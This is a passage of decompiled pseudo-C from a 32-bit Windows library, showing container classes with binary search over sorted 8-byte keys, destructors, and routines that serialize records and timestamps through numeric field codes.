  sub_10039F05(this);
}
// 10103CC4: using guessed type int (__thiscall *off_10103CC4)(void *Block, char);

//----- (1003E7A8) --------------------------------------------------------
bool __thiscall sub_1003E7A8(_DWORD *this, _DWORD *a2)
{
  int v3; // edi
  _DWORD *v4; // eax
  bool result; // al

  v3 = sub_1003F03E(this, a2);
  result = 0;
  if ( v3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3);
    if ( *v4 == *a2 && v4[1] == a2[1] )
      return 1;
  }
  return result;
}

//----- (1003E7E7) --------------------------------------------------------
char __thiscall sub_1003E7E7(_DWORD *this, _DWORD *a2)
{
  int v3; // edi
  _DWORD *v4; // eax

  v3 = sub_1003F03E(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    return 0;
  v4 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3);
  if ( *v4 != *a2 || v4[1] != a2[1] )
    return 0;
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 40))(this + 1, v3);
  (*(void (__thiscall **)(_DWORD *, int))(this[5] + 40))(this + 5, v3);
  return 1;
}

//----- (1003E83C) --------------------------------------------------------
int __thiscall sub_1003E83C(_DWORD *this, _DWORD *a2)
{
  int v3; // ebx
  _DWORD *v4; // eax
  int v5; // eax
  int v7[7]; // [esp+10h] [ebp-20h] BYREF
  int v8; // [esp+2Ch] [ebp-4h]

  v3 = sub_1003F03E(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || (v4 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3), *v4 != *a2)
    || v4[1] != a2[1] )
  {
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[1] + 32))(this + 1, a2, v3);
    v5 = sub_1000B1F3(0, (int)v7, 0);
    v8 = 0;
    (*(void (__thiscall **)(_DWORD *, int, int))(this[5] + 32))(this + 5, v5, v3);
    v8 = -1;
    sub_1000B3DF(v7);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v3);
}
// 1003E83C: using guessed type int var_20[7];

//----- (1003E8C1) --------------------------------------------------------
int __thiscall sub_1003E8C1(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // esi
  int v4; // edi
  _DWORD *v5; // eax
  _DWORD *v7; // eax

  v3 = a2;
  v4 = sub_1003F03E(this, a2);
  if ( v4 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || (v5 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v4), *v5 != *v3)
    || v5[1] != v3[1] )
  {
    v7 = sub_1000E8EF(&a2);
    sub_100078FE((int)v7);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 48))(this + 5, v4);
}

//----- (1003E926) --------------------------------------------------------
void __thiscall sub_1003E926(void *this, int a2, _DWORD *a3)
{
  int v4; // eax
  LONG v5[7]; // [esp+10h] [ebp-20h] BYREF
  int v6; // [esp+2Ch] [ebp-4h]

  sub_1000B36F(a3, (int)v5);
  v6 = 0;
  v4 = (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 16))(this, a2);
  sub_1000B3BD(v5, v4);
  v6 = -1;
  sub_1000B3DF(v5);
}
// 1003E926: using guessed type LONG var_20[7];

//----- (1003E96B) --------------------------------------------------------
int __thiscall sub_1003E96B(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 64))(this + 1);
}

//----- (1003E973) --------------------------------------------------------
void __thiscall sub_1003E973(int this)
{
  *(_DWORD *)this = &off_10103E50;
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  sub_10039F05((_DWORD *)this);
}
// 10103E50: using guessed type int (__thiscall *off_10103E50)(void *Block, char);

//----- (1003E9C2) --------------------------------------------------------
int __thiscall sub_1003E9C2(_DWORD *this, int *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // eax
  _DWORD *v7; // ecx
  int result; // eax
  int v9; // [esp+8h] [ebp-8h]
  int v10; // [esp+Ch] [ebp-4h]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_101332E6);
  v4 = *this;
  v9 = *a2;
  v10 = a2[1];
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
  {
    v7 = (_DWORD *)(this[3] + 8 * i);
    *v7 = *(v7 - 2);
    v7[1] = *(v7 - 1);
  }
  result = this[3];
  *(_DWORD *)(result + 8 * a3) = v9;
  *(_DWORD *)(result + 8 * a3 + 4) = v10;
  ++this[1];
  return result;
}

//----- (1003EA3A) --------------------------------------------------------
int __thiscall sub_1003EA3A(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi
  _DWORD *v4; // eax
  int v5; // eax
  int v6; // ecx

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_101332E7);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = (_DWORD *)(this[3] + 8 * v2);
    *v4 = v4[2];
    v4[1] = v4[3];
    ++v2;
  }
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  v6 = this[3];
  *(_DWORD *)(v6 + 8 * v5) = dword_10193D38;
  *(_DWORD *)(v6 + 8 * v5 + 4) = dword_10193D3C;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 10193D38: using guessed type int dword_10193D38;
// 10193D3C: using guessed type int dword_10193D3C;

//----- (1003EA98) --------------------------------------------------------
int __thiscall sub_1003EA98(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10133326);
  return this[3] + 8 * a2;
}

//----- (1003EAB6) --------------------------------------------------------
int __thiscall sub_1003EAB6(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10133327);
  return this[3] + 8 * a2;
}

//----- (1003EAD4) --------------------------------------------------------
void __thiscall sub_1003EAD4(_DWORD *this, unsigned int a2)
{
  void *v2; // esi

  if ( this[2] < a2 )
  {
    v2 = (void *)this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void *, unsigned int))(*this + 84))(this, this[1], v2, a2);
    j__free(v2);
  }
}

//----- (1003EAF6) --------------------------------------------------------
int __thiscall sub_1003EAF6(_DWORD *this, unsigned int a2)
{
  unsigned int i; // edi
  int v4; // eax
  int v5; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
  {
    v4 = this[3];
    *(_DWORD *)(v4 + 8 * i) = dword_10193D38;
    *(_DWORD *)(v4 + 8 * i + 4) = dword_10193D3C;
  }
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v5 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v5 + 88))(this);
}
// 10193D38: using guessed type int dword_10193D38;
// 10193D3C: using guessed type int dword_10193D3C;

//----- (1003EB44) --------------------------------------------------------
unsigned int __thiscall sub_1003EB44(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1013335E);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 8 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 8 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (1003EBB6) --------------------------------------------------------
unsigned int __thiscall sub_1003EBB6(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // eax
  unsigned int v6; // ebx
  unsigned int result; // eax
  int v8; // ecx
  int v9; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(8 * v5);
  this[1] = a2;
  v6 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      v8 = this[3];
      v9 = 8 * v6;
      *(_DWORD *)(v9 + v8) = *(_DWORD *)(8 * v6 + a3);
      *(_DWORD *)(v9 + v8 + 4) = *(_DWORD *)(8 * v6++ + a3 + 4);
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v6 < result );
  }
  return result;
}

//----- (1003EC22) --------------------------------------------------------
_DWORD *__stdcall sub_1003EC22(_DWORD *a1)
{
  unsigned int i; // eax

  *a1 = off_100FBF5C;
  *a1 = &off_10103E0C;
  sub_1001160C(a1 + 1, 0x10u);
  a1[5] = off_100FBF5C;
  a1[5] = &off_10103E50;
  for ( i = 1; i < 0x10; i *= 2 )
    ;
  a1[6] = 0;
  a1[7] = i;
  a1[8] = operator new(8 * i);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103E0C: using guessed type int (__thiscall *off_10103E0C)(void *Block, char);
// 10103E50: using guessed type int (__thiscall *off_10103E50)(void *Block, char);

//----- (1003EC9D) --------------------------------------------------------
void __thiscall sub_1003EC9D(_DWORD *this)
{
  *this = &off_10103E0C;
  sub_1003E973((int)(this + 5));
  sub_100079EC((int)(this + 1));
  sub_10039F05(this);
}
// 10103E0C: using guessed type int (__thiscall *off_10103E0C)(void *Block, char);

//----- (1003ECE0) --------------------------------------------------------
bool __thiscall sub_1003ECE0(_DWORD *this, _DWORD *a2)
{
  int v3; // edi

  v3 = sub_1003F0D1(this, a2);
  return v3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
      && *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3) == *a2;
}

//----- (1003ED17) --------------------------------------------------------
int __thiscall sub_1003ED17(_DWORD *this, _DWORD *a2)
{
  int v3; // esi
  _DWORD v5[2]; // [esp+Ch] [ebp-8h] BYREF

  v3 = sub_1003F0D1(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3) != *a2 )
  {
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[1] + 32))(this + 1, a2, v3);
    v5[0] = 0;
    v5[1] = 0;
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[5] + 32))(this + 5, v5, v3);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v3);
}
// 1003ED17: using guessed type _DWORD var_8[2];

//----- (1003ED74) --------------------------------------------------------
_DWORD *__thiscall sub_1003ED74(_DWORD *this, _DWORD *a2)
{
  sub_1000791E(this + 1, a2);
  return a2;
}

//----- (1003EDA5) --------------------------------------------------------
_DWORD *__thiscall sub_1003EDA5(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // esi
  int v3; // eax
  int v5; // [esp-8h] [ebp-28h]
  int v6; // [esp-4h] [ebp-24h]

  v2 = this + 5;
  *a2 = off_100FBF5C;
  *a2 = &off_10103E50;
  a2[2] = 1;
  v6 = (*(int (__thiscall **)(_DWORD *))(this[5] + 4))(this + 5);
  v5 = v2[3];
  v3 = (*(int (__thiscall **)(_DWORD *))(*v2 + 4))(v2);
  sub_1003EBB6(a2, v3, v5, v6);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103E50: using guessed type int (__thiscall *off_10103E50)(void *Block, char);

//----- (1003EDFF) --------------------------------------------------------
void *__thiscall sub_1003EDFF(void *Block, char a2)
{
  sub_1003DF87((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003EE1B) --------------------------------------------------------
_DWORD *__thiscall sub_1003EE1B(_DWORD *Block, char a2)
{
  sub_1003E23D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003EE37) --------------------------------------------------------
void *__thiscall sub_1003EE37(void *Block, char a2)
{
  sub_1003E4D0((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003EE53) --------------------------------------------------------
_DWORD *__thiscall sub_1003EE53(_DWORD *Block, char a2)
{
  sub_1003E765(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003EE6F) --------------------------------------------------------
void *__thiscall sub_1003EE6F(void *Block, char a2)
{
  sub_1003E973((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003EE8B) --------------------------------------------------------
_DWORD *__thiscall sub_1003EE8B(_DWORD *Block, char a2)
{
  sub_1003EC9D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003EEA7) --------------------------------------------------------
_DWORD *__userpurge sub_1003EEA7@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-24h]
  int v5; // [esp-4h] [ebp-20h]

  sub_1000E6CA(a2);
  *a2 = &off_10102828;
  a2[2] = 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_10015ACC(a2, v2, v4, v5);
  return a2;
}
// 10102828: using guessed type int (__thiscall *off_10102828)(void *Block, char);

//----- (1003EEF5) --------------------------------------------------------
_DWORD *__stdcall sub_1003EEF5(_DWORD *a1)
{
  int v1; // eax

  sub_1000E6CA(a1);
  *a1 = &off_10102828;
  v1 = sub_1001411E(1u, 0x10u);
  sub_10015B58(v1, a1);
  return a1;
}
// 10102828: using guessed type int (__thiscall *off_10102828)(void *Block, char);

//----- (1003EF32) --------------------------------------------------------
_DWORD *__stdcall sub_1003EF32(_DWORD *a1)
{
  _DWORD *v1; // ebx
  unsigned int i; // edi
  int v3; // ecx
  unsigned int *v4; // eax

  sub_10032FFF(a1);
  v1 = 0;
  *a1 = &off_10103BA0;
  for ( i = 1; i < 0x10; i *= 2 )
    ;
  a1[1] = 0;
  a1[2] = i;
  v3 = (20 * (unsigned __int64)i) >> 32 != 0 ? -1 : 20 * i;
  v4 = (unsigned int *)operator new(__CFADD__(v3, 4) ? -1 : v3 + 4);
  if ( v4 )
  {
    v1 = v4 + 1;
    *v4 = i;
    `eh vector constructor iterator'(v4 + 1, 0x14u, i, sub_1003ACB2, (void (__thiscall *)(void *))sub_1000B3DF);
  }
  a1[3] = v1;
  return a1;
}
// 10103BA0: using guessed type int (__thiscall *off_10103BA0)(void *Block, char);

//----- (1003EFBD) --------------------------------------------------------
int __userpurge sub_1003EFBD@<eax>(_DWORD *a1@<ebx>, _DWORD *a2)
{
  int v2; // esi
  int v3; // eax
  int v5; // [esp+4h] [ebp-8h]
  int v6; // [esp+8h] [ebp-4h]

  v6 = -1;
  v2 = (unsigned int)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1) >> 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  if ( v2 > -1 )
  {
    do
    {
      if ( v2 >= v5 || *a2 == *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2) )
        break;
      if ( *a2 >= *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2) )
      {
        v6 = v2;
        v3 = v5 + v2 + 1;
      }
      else
      {
        v5 = v2;
        v3 = v2 + v6;
      }
      v2 = v3 / 2;
    }
    while ( v3 / 2 > v6 );
  }
  if ( v2 == v6 )
    return v6 + 1;
  return v2;
}

//----- (1003F03E) --------------------------------------------------------
int __userpurge sub_1003F03E@<eax>(_DWORD *a1@<ebx>, _DWORD *a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  int v4; // eax
  int v6; // [esp+4h] [ebp-8h]
  int v7; // [esp+8h] [ebp-4h]

  v7 = -1;
  v2 = (unsigned int)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1) >> 1;
  v6 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  if ( v2 > -1 )
  {
    do
    {
      if ( v2 >= v6 )
        break;
      v3 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2);
      if ( *a2 == *v3 && a2[1] == v3[1] )
        break;
      if ( *(_QWORD *)a2 >= *(_QWORD *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2) )
      {
        v7 = v2;
        v4 = v6 + v2 + 1;
      }
      else
      {
        v6 = v2;
        v4 = v2 + v7;
      }
      v2 = v4 / 2;
    }
    while ( v4 / 2 > v7 );
  }
  if ( v2 == v7 )
    return v7 + 1;
  return v2;
}

//----- (1003F0D1) --------------------------------------------------------
int __userpurge sub_1003F0D1@<eax>(_DWORD *a1@<ebx>, _DWORD *a2)
{
  int v2; // esi
  int v3; // eax
  int v5; // [esp+4h] [ebp-8h]
  int v6; // [esp+8h] [ebp-4h]

  v6 = -1;
  v2 = (unsigned int)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1) >> 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  if ( v2 > -1 )
  {
    do
    {
      if ( v2 >= v5 || *a2 == *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2) )
        break;
      if ( *a2 >= *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2) )
      {
        v6 = v2;
        v3 = v5 + v2 + 1;
      }
      else
      {
        v5 = v2;
        v3 = v2 + v6;
      }
      v2 = v3 / 2;
    }
    while ( v3 / 2 > v6 );
  }
  if ( v2 == v6 )
    return v6 + 1;
  return v2;
}

//----- (1003F152) --------------------------------------------------------
int __thiscall sub_1003F152(
        volatile LONG *this,
        int a2,
        int a3,
        volatile LONG *lpAddend,
        _DWORD *a5,
        char a6,
        _DWORD *a7,
        char a8,
        int a9,
        char a10,
        int *a11,
        int *a12)
{
  _DWORD *v12; // esi
  char v13; // al
  int v14; // ecx
  int v15; // eax
  _DWORD *v16; // esi
  char v17; // al
  int v19; // [esp-18h] [ebp-34h] BYREF
  volatile LONG *v20; // [esp-14h] [ebp-30h]
  int *v21; // [esp-10h] [ebp-2Ch]
  volatile LONG *v22; // [esp-Ch] [ebp-28h] BYREF
  volatile LONG *v23; // [esp-8h] [ebp-24h]
  int *v24; // [esp-4h] [ebp-20h]
  int v25; // [esp+18h] [ebp-4h]

  v25 = 0;
  v24 = a12;
  v23 = this;
  v22 = this;
  a12 = (int *)&v22;
  sub_1000728E(&v22, 0);
  LOBYTE(v25) = 1;
  v21 = a11;
  a11 = &v19;
  v20 = lpAddend;
  v19 = a3;
  InterlockedIncrement(lpAddend);
  LOBYTE(v25) = 0;
  sub_1002E489((_DWORD *)a2, v19, v20, (int)v21, (int)v22, v23, (int)v24);
  LOBYTE(v25) = 3;
  v12 = a5;
  v13 = a6;
  v14 = a3;
  *(_DWORD *)a2 = &off_10103F0C;
  *(_DWORD *)(a2 + 28) = *v12++;
  *(_DWORD *)(a2 + 32) = *v12++;
  *(_DWORD *)(a2 + 36) = *v12;
  *(_DWORD *)(a2 + 40) = v12[1];
  *(_BYTE *)(a2 + 44) = v13;
  v15 = (*(int (__thiscall **)(int))(*(_DWORD *)v14 + 12))(v14);
  v16 = a7;
  *(_DWORD *)(a2 + 48) = v15;
  *(_BYTE *)(a2 + 52) = a8;
  sub_1000809E(v16, (_DWORD *)(a2 + 56));
  *(_DWORD *)(a2 + 72) = a9;
  v17 = a10;
  *(_BYTE *)(a2 + 76) = 1;
  *(_BYTE *)(a2 + 77) = v17;
  v25 = -1;
  sub_1000780D(&a3);
  return a2;
}
// 10103F0C: using guessed type int (__thiscall *off_10103F0C)(void *Block, char);

//----- (1003F205) --------------------------------------------------------
_DWORD *__thiscall sub_1003F205(_DWORD *Block, char a2)
{
  sub_1003F221(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003F221) --------------------------------------------------------
void __thiscall sub_1003F221(_DWORD *this)
{
  *this = &off_10103F0C;
  sub_100068A5(this + 14);
  sub_1002E517(this);
}
// 10103F0C: using guessed type int (__thiscall *off_10103F0C)(void *Block, char);

//----- (1003F255) --------------------------------------------------------
int __thiscall sub_1003F255(char *this, int *a2)
{
  int v4; // ecx
  int v5; // eax
  int v6; // eax
  int v7; // esi
  _DWORD v8[9]; // [esp+10h] [ebp-7Ch] BYREF
  int v9[9]; // [esp+34h] [ebp-58h] BYREF
  int v10[5]; // [esp+58h] [ebp-34h] BYREF
  SYSTEMTIME v11; // [esp+6Ch] [ebp-20h] BYREF
  int v12; // [esp+88h] [ebp-4h]
  int *v13; // [esp+94h] [ebp+8h]

  v12 = 0;
  if ( a2[1] != 52 )
    return 1;
  v4 = *a2;
  v13 = (int *)v4;
  v5 = *(_DWORD *)(v4 + 44);
  if ( v5 == 1 || v5 == 2 || v5 == 3 )
  {
    sub_1004C84F(&v11, v4);
    if ( sub_1002FC2C(v11, *(SYSTEMTIME *)(this + 28)) )
    {
      sub_1001AC1E((int)v8);
      LOBYTE(v12) = 1;
      sub_1001A969(v8, v9, 1);
      LOBYTE(v12) = 2;
      sub_1003F4B3((int)this, v9, v13);
      this[76] = 0;
      sub_100203E8(v9);
      v6 = sub_1001AD84(v8, (int)v10);
      LOBYTE(v12) = 3;
      v7 = (*(int (__thiscall **)(char *, int))(*(_DWORD *)this + 12))(this, v6);
      LOBYTE(v12) = 2;
      sub_1000B3DF(v10);
      if ( v7 )
      {
        LOBYTE(v12) = 1;
        sub_1001A9CE((int)v9);
        LOBYTE(v12) = 0;
        sub_1001AC89((int)v8);
        return v7;
      }
      LOBYTE(v12) = 1;
      sub_1001A9CE((int)v9);
      LOBYTE(v12) = 0;
      sub_1001AC89((int)v8);
      v12 = -1;
    }
  }
  return 0;
}
// 1003F255: using guessed type _DWORD var_7C[9];
// 1003F255: using guessed type int var_58[9];
// 1003F255: using guessed type int var_34[5];

//----- (1003F373) --------------------------------------------------------
void __usercall sub_1003F373(int a1@<edi>, int *a2@<esi>)
{
  int v2; // eax
  size_t v3; // eax
  int v4; // eax
  _DWORD v5[4]; // [esp-14h] [ebp-48h] BYREF
  void *v6; // [esp-4h] [ebp-38h]
  int v7[8]; // [esp+10h] [ebp-24h] BYREF
  int v8; // [esp+30h] [ebp-4h]

  if ( *(_BYTE *)(a1 + 76) )
  {
    (*(void (__thiscall **)(int *, int))(*a2 + 60))(a2, 1002);
    v2 = *(_DWORD *)(a1 + 72);
    v6 = *(void **)(*(_DWORD *)(v2 + 604) + 12);
    v3 = sub_1000D687(v2 + 600);
    sub_1000B1F3((void *)(2 * v3), (int)v7, v6);
    v8 = 0;
    v7[5] = (int)v5;
    sub_1000B36F(v7, (int)v5);
    LOBYTE(v8) = 1;
    v4 = *a2;
    LOBYTE(v8) = 0;
    (*(void (__thiscall **)(int *, _DWORD, _DWORD, _DWORD, _DWORD, void *))(v4 + 80))(
      a2,
      v5[0],
      v5[1],
      v5[2],
      v5[3],
      v6);
    v8 = -1;
    sub_1000B3DF(v7);
  }
}

//----- (1003F3E9) --------------------------------------------------------
int __thiscall sub_1003F3E9(_DWORD *this, char a2)
{
  int v3; // eax
  _DWORD v5[9]; // [esp+10h] [ebp-68h] BYREF
  int v6[9]; // [esp+34h] [ebp-44h] BYREF
  int v7[7]; // [esp+58h] [ebp-20h] BYREF
  int v8; // [esp+74h] [ebp-4h]

  sub_1001AC1E((int)v5);
  v8 = 0;
  sub_1001A969(v5, v6, 1);
  LOBYTE(v8) = 1;
  sub_1001AA80(v6, 233);
  sub_1001AA80(v6, *(_DWORD *)(this[18] + 616));
  sub_1001AA80(v6, 232);
  sub_1001AA80(v6, -1);
  sub_1003F373((int)this, v6);
  sub_1001AA80(v6, 236);
  sub_1001AA80(v6, a2);
  sub_100203E8(v6);
  v3 = sub_1001AD84(v5, (int)v7);
  LOBYTE(v8) = 2;
  (*(void (__thiscall **)(_DWORD *, int))(*this + 12))(this, v3);
  LOBYTE(v8) = 1;
  sub_1000B3DF(v7);
  LOBYTE(v8) = 0;
  sub_1001A9CE((int)v6);
  v8 = -1;
  return sub_1001AC89((int)v5);
}
// 1003F3E9: using guessed type _DWORD var_68[9];
// 1003F3E9: using guessed type int var_44[9];
// 1003F3E9: using guessed type int var_20[7];

//----- (1003F4B3) --------------------------------------------------------
void __thiscall sub_1003F4B3(int this, int *a2, int *a3)
{
  int *v4; // ebx
  int *v5; // esi
  _DWORD *v6; // esi
  wchar_t *v7; // eax
  int v8; // eax
  void *v9; // eax
  size_t v10; // eax
  int v11; // eax
  int v12; // eax
  int wDay; // [esp+0h] [ebp-84h]
  void *v14; // [esp+0h] [ebp-84h]
  int wMonth; // [esp+4h] [ebp-80h] BYREF
  int wYear; // [esp+8h] [ebp-7Ch]
  int wHour; // [esp+Ch] [ebp-78h]
  int wMinute; // [esp+10h] [ebp-74h]
  int wSecond; // [esp+14h] [ebp-70h]
  void *v20[2]; // [esp+28h] [ebp-5Ch] BYREF
  int v21[2]; // [esp+30h] [ebp-54h] BYREF
  struct _SYSTEMTIME v22; // [esp+38h] [ebp-4Ch] BYREF
  int v23[5]; // [esp+4Ch] [ebp-38h] BYREF
  int v24[6]; // [esp+60h] [ebp-24h] BYREF
  int v25; // [esp+80h] [ebp-4h]

  v4 = a2;
  (*(void (__thiscall **)(int *, int))(*a2 + 60))(a2, 1001);
  (*(void (__thiscall **)(int *, _DWORD))(*v4 + 60))(v4, *(_DWORD *)(*(_DWORD *)(this + 72) + 616));
  (*(void (__thiscall **)(int *, int))(*v4 + 60))(v4, 1000);
  (*(void (__thiscall **)(int *, int))(*v4 + 60))(v4, a3[12]);
  sub_1003F373(this, a2);
  (*(void (__thiscall **)(int *, int))(*v4 + 60))(v4, 1005);
  v5 = a3;
  (*(void (__thiscall **)(int *, int))(*v4 + 60))(v4, a3[11]);
  sub_1003F846(a3, &v22, a2, (_DWORD *)0xA);
  v25 = -1;
  sub_1000B3DF((int *)&v22);
  if ( *(_BYTE *)(this + 77) )
  {
    sub_1003F846(a3, &v22, a2, (_DWORD *)6);
    v25 = -1;
    sub_1000B3DF((int *)&v22);
  }
  sub_1003F846(a3, v23, a2, (_DWORD *)9);
  v25 = 2;
  if ( !v23[3] )
  {
    sub_1003F846(a3, v24, a2, (_DWORD *)3);
    LOBYTE(v25) = 2;
    sub_1000B3DF(v24);
    sub_1003F846(a3, v24, a2, (_DWORD *)5);
    LOBYTE(v25) = 2;
    sub_1000B3DF(v24);
    sub_1003F846(a3, v24, a2, 0);
    LOBYTE(v25) = 2;
    sub_1000B3DF(v24);
    sub_1003F846(a3, v24, a2, (_DWORD *)2);
    LOBYTE(v25) = 2;
    sub_1000B3DF(v24);
    sub_1003F846(a3, v24, a2, (_DWORD *)1);
    LOBYTE(v25) = 2;
    sub_1000B3DF(v24);
    sub_1003F846(a3, v24, a2, (_DWORD *)0xB);
    LOBYTE(v25) = 2;
    sub_1000B3DF(v24);
    sub_1003F846(a3, v24, a2, (_DWORD *)0xC);
    LOBYTE(v25) = 2;
    sub_1000B3DF(v24);
    sub_1004C84F(&v22, (int)a3);
    v6 = sub_1000D17D(v20, &word_1017598C);
    LOBYTE(v25) = 10;
    wSecond = v22.wSecond;
    wMinute = v22.wMinute;
    wHour = v22.wHour;
    wYear = v22.wYear;
    wMonth = v22.wMonth;
    wDay = v22.wDay;
    v7 = (wchar_t *)sub_1000CC40((int)&unk_10175990);
    v8 = sub_1000D6C3((int)v6, v7, wDay, wMonth, wYear, wHour, wMinute, wSecond);
    sub_1000D372(v21, v8);
    LOBYTE(v25) = 12;
    sub_1000D3AD((int *)v20);
    (*(void (__thiscall **)(int *, int))(*a2 + 60))(a2, 4);
    v9 = *(void **)(v21[1] + 12);
    v20[0] = &wMonth;
    v14 = v9;
    v10 = sub_1000D687((int)v21);
    sub_1000B1F3((void *)(2 * v10), (int)&wMonth, v14);
    LOBYTE(v25) = 13;
    v11 = *a2;
    LOBYTE(v25) = 12;
    (*(void (__thiscall **)(int *, int, int, int, int, int))(v11 + 80))(a2, wMonth, wYear, wHour, wMinute, wSecond);
    LOBYTE(v25) = 2;
    sub_1000D3AD(v21);
    v4 = a2;
    v5 = a3;
  }
  v12 = v5[11];
  if ( v12 == 3 || v12 == 2 )
  {
    sub_1003F846(v5, v24, v4, (_DWORD *)0xE);
    LOBYTE(v25) = 2;
    sub_1000B3DF(v24);
    sub_1003F846(v5, v24, v4, (_DWORD *)0xF);
    LOBYTE(v25) = 2;
    sub_1000B3DF(v24);
    sub_1003F846(v5, v24, v4, (_DWORD *)0x10);
    LOBYTE(v25) = 2;
